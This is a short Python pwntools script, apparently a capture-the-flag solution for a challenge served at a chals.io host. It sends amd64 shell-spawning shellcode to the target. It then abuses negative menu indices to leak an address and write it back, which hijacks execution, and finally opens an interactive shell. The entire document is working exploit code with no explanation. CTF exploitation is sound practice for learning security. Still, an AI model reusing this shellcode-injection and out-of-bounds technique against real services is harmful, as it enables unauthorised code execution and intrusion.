#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
e = ELF(args.BIN)

if args.LIBC:
    libc = ELF(args.LIBC)
else:
    libc = e.libc

r = ROP([e, libc])

gs = '''
continue
'''

RHOST = '0.cloud.chals.io'
RPORT = '34840'

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(RHOST, RPORT)
    else:
        return process(e.path)
p = start()

# Fun stuff goes here
p.sendline(asm(shellcraft.amd64.linux.sh(), arch='amd64'))
p.sendline(b'4')
p.sendline(b'-1')
p.recvuntil(b'coordinates: ')
address = p.recvline()
p.sendline(b'3')
p.sendline(b'-3')
p.sendline(address)

p.interactive()

